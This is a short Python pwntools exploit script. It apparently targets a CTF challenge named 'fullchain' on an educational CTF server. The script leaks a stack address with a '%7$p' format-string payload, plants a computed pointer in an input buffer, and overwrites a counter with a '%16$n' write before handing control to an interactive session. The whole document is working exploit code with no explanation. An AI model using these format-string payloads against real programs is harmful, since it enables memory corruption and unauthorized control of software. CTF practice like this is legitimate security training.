from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = remote('edu-ctf.zoolab.org', 30201)
# r = process('./fullchain')
# gdb.attach(r)

r.sendafter('global or local > ', b'local\n')
r.sendafter('set, read or write > ', b'write%7$p\n')

r.recvuntil('write')
cnt = r.recvuntil('g')[:-1]
print(cnt)
cnt_address = int(cnt.decode(), base = 16) - 12

r.sendafter("lobal or local > ", b'local\n')
r.sendafter('set, read or write > ', b'read\n')
r.send(b'a' * 16 + p64(cnt_address))

r.sendafter("global or local > ", b'local\n')
r.sendafter('set, read or write > ', b'write%16$n\n')

# r.sendafter('global or local > ', b'local\n')
# r.sendafter('set, read or write > ', b'write%7$p\n')
# r.sendafter('global or local > ', b'local\n')
# r.sendafter('set, read or write > ', b'write%7$p\n')
# r.sendafter('global or local > ', b'local\n')
# r.sendafter('set, read or write > ', b'write%7$p\n')
# r.sendafter('global or local > ', b'local\n')
# r.sendafter('set, read or write > ', b'write%7$p\n')
# r.sendafter('global or local > ', b'local\n')
# r.sendafter('set, read or write > ', b'write%7$p\n')

r.interactive()